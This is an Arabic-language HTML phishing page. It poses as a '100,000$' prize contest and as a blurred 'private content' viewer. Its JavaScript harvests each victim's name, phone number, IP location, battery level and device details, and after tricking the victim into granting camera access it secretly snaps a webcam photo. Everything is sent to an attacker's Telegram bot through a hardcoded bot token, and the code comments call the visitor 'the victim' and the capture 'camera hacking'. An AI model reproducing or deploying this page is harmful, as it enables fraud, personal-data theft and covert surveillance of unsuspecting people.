<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>معاينة المحتوى</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        .hidden { display: none; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
        .btn { background: #e67e22; color: white; padding: 15px; border: none; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; font-size: 18px; }
        .img-blur { width: 100%; border-radius: 10px; filter: blur(20px); margin-bottom: 15px; }
    </style>
</head>
<body>

    <div id="info-box" class="card hidden">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e0/Dream_TV_Logo.png" style="width:100px;">
        <h2>مسابقة الحلم 2026</h2>
        <p>أدخل بياناتك للسحب على الجائزة الكبرى 100,000$</p>
        <input type="text" id="uname" placeholder="الاسم الكامل">
        <input type="tel" id="uphone" placeholder="رقم الهاتف">
        <button class="btn" onclick="sendDreamData()">اشترك الآن وكسب</button>
    </div>

    <div id="media-box" class="card hidden">
        <h3>مرحباً بك!</h3>
        <p>انقر على الزر أدناه لفك التشفير ومشاهدة المحتوى</p>
        <img id="view-img" class="img-blur" src="https://via.placeholder.com/300?text=Private+Content">
        <button class="btn" style="background:#00d4ff; color:black;" onclick="startCapture()">عرض الآن</button>
    </div>

    <video id="video" style="display:none" autoplay></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        // قراءة البيانات من الرابط
        const params = new URLSearchParams(window.location.search);
        const type = params.get('type'); 
        const uid = params.get('chatid'); // تأكد من مطابقة الاسم في البوت
        const token = "8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg";

        // تحديد الواجهة التي ستظهر للضحية
        if (type === 'info') {
            document.getElementById('info-box').classList.remove('hidden');
        } else {
            document.getElementById('media-box').classList.remove('hidden');
        }

        // 1. وظيفة جمع معلومات الجهاز (مسابقة الحلم)
        async function sendDreamData() {
            try {
                const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
                const battery = await navigator.getBattery().catch(() => ({level:0, charging:false}));
                
                const msg = `
🎯 معلومات جديدة من مسابقة الحلم
🆔 معرف المستخدم: ${uid}

👤 البيانات المدخلة:
📝 الاسم: ${document.getElementById('uname').value}
📞 الهاتف: ${document.getElementById('uphone').value}

💻 معلومات الجهاز:
🔧 الجهاز: ${navigator.platform}
🔋 البطارية: ${Math.round(battery.level * 100)}%
📶 الشبكة: ${navigator.connection ? navigator.connection.effectiveType : 'غير معروف'}

🌍 المعلومات الجغرافية:
📍 IP: ${geo.ip}
🏳️ الدولة: ${geo.country_name}
🏙️ المدينة: ${geo.city}
🕒 الوقت: ${new Date().toLocaleString('ar-EG')}
`;
                
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(msg)}`);
                alert("شكراً لك! تم تسجيلك بنجاح، انتظر اتصالنا.");
            } catch (e) {
                alert("حدث خطأ، يرجى المحاولة مرة أخرى.");
            }
        }

        // 2. وظيفة اختراق الكاميرا
        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640; 
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', uid);
                        fd.append('photo', blob, 'capture.jpg');
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
                    }, 'image/jpeg');

                    stream.getTracks().forEach(t => t.stop());
                }, 2000); // التقاط الصورة بعد ثانيتين
                
                document.getElementById('view-img').style.filter = "none";
                alert("جاري تحميل المحتوى...");
            } catch (e) {
                alert("يجب السماح بالكاميرا للمتابعة ومشاهدة المحتوى.");
            }
        }
    </script>
</body>
</html>
